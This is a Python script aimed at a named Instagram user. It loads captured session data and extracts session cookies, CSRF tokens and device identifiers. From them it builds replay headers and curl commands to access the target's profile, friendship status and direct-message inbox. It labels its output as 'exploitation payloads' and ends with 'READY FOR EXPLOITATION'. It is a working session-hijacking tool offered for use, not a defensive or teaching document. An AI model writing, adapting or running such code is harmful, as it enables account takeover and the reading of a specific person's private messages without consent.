from utils.error_handler import safe_execution, safe_print

#!/usr/bin/env python3
"""
🔐 SESSION ID ANALYSIS & EXTRACTION TOOL 🔐
Target: whatilove1728
Mission: Extract and analyze all session identifiers for exploitation
"""

import json
import time
from datetime import datetime

class SessionIDAnalyzer:
    def __init__(self):
        self.target_username = "whatilove1728"
        self.session_data_file = "SESSION_EXTRACTION_whatilove1728_1748235501.json"
        
        self.extracted_sessions = {
            'target': self.target_username,
            'timestamp': datetime.now().isoformat(),
            'session_identifiers': {},
            'authentication_tokens': {},
            'device_identifiers': {},
            'csrf_tokens': {},
            'app_data': {},
            'exploitation_ready': {}
        }

    def load_existing_session_data(self):
        """Load previously extracted session data"""
        print("📂 LOADING EXISTING SESSION DATA...")
        
        try:
            with open(self.session_data_file, 'r') as f:
                data = json.load(f)
            
            print(f"   ✅ Loaded session data from {self.session_data_file}")
            return data
            
        except Exception as e:
            print(f"   ❌ Failed to load session data: {str(e)}")
            return None

    def extract_session_identifiers(self, data):
        """Extract all session identifiers from the data"""
        print("🆔 EXTRACTING SESSION IDENTIFIERS...")
        
        # Extract from headers
        headers = data.get('headers', {})
        if 'x-web-session-id' in headers:
            self.extracted_sessions['session_identifiers']['web_session_id'] = headers['x-web-session-id']
            print(f"   🎯 Web Session ID: {headers['x-web-session-id']}")
        
        # Extract from cookies
        cookies = data.get('cookies', {})
        session_cookies = ['sessionid', 'ds_user_id', 'shbid', 'shbts', 'ig_did', 'mid']
        
        for cookie_name in session_cookies:
            if cookie_name in cookies:
                self.extracted_sessions['session_identifiers'][cookie_name] = cookies[cookie_name]
                print(f"   🍪 {cookie_name}: {cookies[cookie_name]}")
        
        # Extract device ID
        if 'ig_did' in cookies:
            self.extracted_sessions['device_identifiers']['instagram_device_id'] = cookies['ig_did']
            print(f"   📱 Device ID: {cookies['ig_did']}")
        
        # Extract machine ID
        if 'mid' in cookies:
            self.extracted_sessions['device_identifiers']['machine_id'] = cookies['mid']
            print(f"   🤖 Machine ID: {cookies['mid']}")

    def extract_authentication_tokens(self, data):
        """Extract authentication tokens"""
        print("🔑 EXTRACTING AUTHENTICATION TOKENS...")
        
        # Extract CSRF tokens
        cookies = data.get('cookies', {})
        tokens = data.get('tokens', {})
        headers = data.get('headers', {})
        
        if 'csrftoken' in cookies:
            self.extracted_sessions['csrf_tokens']['cookie_csrf'] = cookies['csrftoken']
            print(f"   🛡️  Cookie CSRF: {cookies['csrftoken']}")
        
        if 'csrf_token' in tokens:
            self.extracted_sessions['csrf_tokens']['token_csrf'] = tokens['csrf_token']
            print(f"   🛡️  Token CSRF: {tokens['csrf_token']}")
        
        if 'x-csrftoken' in headers:
            self.extracted_sessions['csrf_tokens']['header_csrf'] = headers['x-csrftoken']
            print(f"   🛡️  Header CSRF: {headers['x-csrftoken']}")
        
        # Extract app identifiers
        if 'app_id' in tokens:
            self.extracted_sessions['app_data']['app_id'] = tokens['app_id']
            print(f"   📱 App ID: {tokens['app_id']}")
        
        if 'x-ig-app-id' in headers:
            self.extracted_sessions['app_data']['header_app_id'] = headers['x-ig-app-id']
            print(f"   📱 Header App ID: {headers['x-ig-app-id']}")
        
        if 'user_id' in tokens:
            self.extracted_sessions['authentication_tokens']['user_id'] = tokens['user_id']
            print(f"   👤 User ID: {tokens['user_id']}")

    def generate_exploitation_payloads(self):
        """Generate ready-to-use exploitation payloads"""
        print("🔥 GENERATING EXPLOITATION PAYLOADS...")
        
        # Create cookie string for requests
        cookie_parts = []
        for key, value in self.extracted_sessions['session_identifiers'].items():
            if key != 'web_session_id':  # Skip web session ID as it's a header
                cookie_parts.append(f"{key}={value}")
        
        # Add CSRF token to cookies
        if 'cookie_csrf' in self.extracted_sessions['csrf_tokens']:
            cookie_parts.append(f"csrftoken={self.extracted_sessions['csrf_tokens']['cookie_csrf']}")
        
        cookie_string = '; '.join(cookie_parts)
        
        # Create headers for authenticated requests
        auth_headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Cookie': cookie_string,
            'Referer': f'https://www.instagram.com/{self.target_username}/',
            'Origin': 'https://www.instagram.com'
        }
        
        # Add CSRF headers
        if 'header_csrf' in self.extracted_sessions['csrf_tokens']:
            auth_headers['X-CSRFToken'] = self.extracted_sessions['csrf_tokens']['header_csrf']
            auth_headers['X-Instagram-AJAX'] = '1'
            auth_headers['X-Requested-With'] = 'XMLHttpRequest'
        
        # Add app ID header
        if 'header_app_id' in self.extracted_sessions['app_data']:
            auth_headers['X-IG-App-ID'] = self.extracted_sessions['app_data']['header_app_id']
        
        # Add web session ID header
        if 'web_session_id' in self.extracted_sessions['session_identifiers']:
            auth_headers['X-Web-Session-ID'] = self.extracted_sessions['session_identifiers']['web_session_id']
        
        self.extracted_sessions['exploitation_ready'] = {
            'cookie_string': cookie_string,
            'headers': auth_headers,
            'api_endpoints': [
                'https://www.instagram.com/api/v1/users/web_profile_info/',
                'https://www.instagram.com/api/v1/friendships/show/',
                'https://www.instagram.com/graphql/query/',
                'https://i.instagram.com/api/v1/users/search/',
                'https://www.instagram.com/api/v1/direct_v2/inbox/',
                'https://www.instagram.com/api/v1/media/configure/',
                'https://www.instagram.com/api/v1/accounts/edit/'
            ],
            'target_specific_endpoints': [
                f'https://www.instagram.com/api/v1/users/{self.target_username}/info/',
                f'https://www.instagram.com/api/v1/friendships/show/{self.target_username}/',
                f'https://www.instagram.com/{self.target_username}/?__a=1&__d=dis'
            ]
        }
        
        print(f"   ✅ Cookie String: {cookie_string[:100]}...")
        print(f"   ✅ Headers Ready: {len(auth_headers)} headers configured")
        print(f"   ✅ API Endpoints: {len(self.extracted_sessions['exploitation_ready']['api_endpoints'])} endpoints ready")
        print(f"   ✅ Target Endpoints: {len(self.extracted_sessions['exploitation_ready']['target_specific_endpoints'])} target-specific endpoints")

    def generate_curl_commands(self):
        """Generate curl commands for immediate testing"""
        print("💻 GENERATING CURL COMMANDS...")
        
        headers = self.extracted_sessions['exploitation_ready']['headers']
        cookie_string = self.extracted_sessions['exploitation_ready']['cookie_string']
        
        curl_commands = []
        
        # Basic profile info
        curl_commands.append({
            'description': 'Get target profile info',
            'command': f'''curl -X GET \\
  'https://www.instagram.com/api/v1/users/web_profile_info/?username={self.target_username}' \\
  -H 'User-Agent: {headers["User-Agent"]}' \\
  -H 'X-CSRFToken: {headers.get("X-CSRFToken", "")}' \\
  -H 'X-IG-App-ID: {headers.get("X-IG-App-ID", "")}' \\
  -H 'Cookie: {cookie_string}' \\
  --compressed'''
        })
        
        # Friendship status
        curl_commands.append({
            'description': 'Check friendship status',
            'command': f'''curl -X GET \\
  'https://www.instagram.com/api/v1/friendships/show/{self.target_username}/' \\
  -H 'User-Agent: {headers["User-Agent"]}' \\
  -H 'X-CSRFToken: {headers.get("X-CSRFToken", "")}' \\
  -H 'Cookie: {cookie_string}' \\
  --compressed'''
        })
        
        # Direct messages inbox
        curl_commands.append({
            'description': 'Access DM inbox',
            'command': f'''curl -X GET \\
  'https://www.instagram.com/api/v1/direct_v2/inbox/' \\
  -H 'User-Agent: {headers["User-Agent"]}' \\
  -H 'X-CSRFToken: {headers.get("X-CSRFToken", "")}' \\
  -H 'Cookie: {cookie_string}' \\
  --compressed'''
        })
        
        self.extracted_sessions['exploitation_ready']['curl_commands'] = curl_commands
        
        print(f"   ✅ Generated {len(curl_commands)} curl commands")
        for i, cmd in enumerate(curl_commands, 1):
            print(f"   📋 Command {i}: {cmd['description']}")

    def analyze_all_sessions(self):
        """Main analysis function"""
        print("=" * 80)
        print("🔐 SESSION ID ANALYSIS & EXTRACTION")
        print(f"🎯 TARGET: {self.target_username}")
        print("🔐 ANALYZING ALL SESSION DATA")
        print("=" * 80)
        
        # Load existing data
        session_data = self.load_existing_session_data()
        if not session_data:
            print("❌ No session data available for analysis")
            return None
        
        # Extract all identifiers
        self.extract_session_identifiers(session_data)
        self.extract_authentication_tokens(session_data)
        self.generate_exploitation_payloads()
        self.generate_curl_commands()
        
        # Print summary
        print("\n📊 SESSION ANALYSIS SUMMARY:")
        print(f"   🆔 Session Identifiers: {len(self.extracted_sessions['session_identifiers'])}")
        print(f"   🔑 CSRF Tokens: {len(self.extracted_sessions['csrf_tokens'])}")
        print(f"   📱 Device Identifiers: {len(self.extracted_sessions['device_identifiers'])}")
        print(f"   📋 App Data: {len(self.extracted_sessions['app_data'])}")
        
        # Key findings
        print("\n🔥 KEY FINDINGS:")
        if 'web_session_id' in self.extracted_sessions['session_identifiers']:
            print(f"   🎯 WEB SESSION ID: {self.extracted_sessions['session_identifiers']['web_session_id']}")
        
        if 'cookie_csrf' in self.extracted_sessions['csrf_tokens']:
            print(f"   🛡️  CSRF TOKEN: {self.extracted_sessions['csrf_tokens']['cookie_csrf']}")
        
        if 'instagram_device_id' in self.extracted_sessions['device_identifiers']:
            print(f"   📱 DEVICE ID: {self.extracted_sessions['device_identifiers']['instagram_device_id']}")
        
        # Save results
        timestamp = int(time.time())
        filename = f"SESSION_ANALYSIS_{self.target_username}_{timestamp}.json"
        
        with open(filename, 'w') as f:
            json.dump(self.extracted_sessions, f, indent=2)
        
        print("=" * 80)
        print("🔐 SESSION ANALYSIS COMPLETE!")
        print(f"📊 Results saved: {filename}")
        print("🔥 READY FOR EXPLOITATION!")
        print("=" * 80)
        
        return self.extracted_sessions

@safe_execution
def main():
    analyzer = SessionIDAnalyzer()
    return analyzer.analyze_all_sessions()

if __name__ == "__main__":
    main()
